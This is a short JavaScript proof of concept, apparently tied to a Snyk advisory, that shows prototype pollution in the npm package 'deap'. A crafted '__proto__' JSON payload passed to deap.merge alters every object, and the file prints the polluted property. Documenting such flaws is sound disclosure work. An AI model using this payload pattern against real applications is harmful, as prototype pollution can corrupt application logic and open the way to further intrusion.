//https://snyk.io/vuln/npm:deap:20180415
const deap= require('deap');

deap.merge({}, JSON.parse('{ "__proto__": { "polluted": "yes" } }'));

console.log({}.polluted);
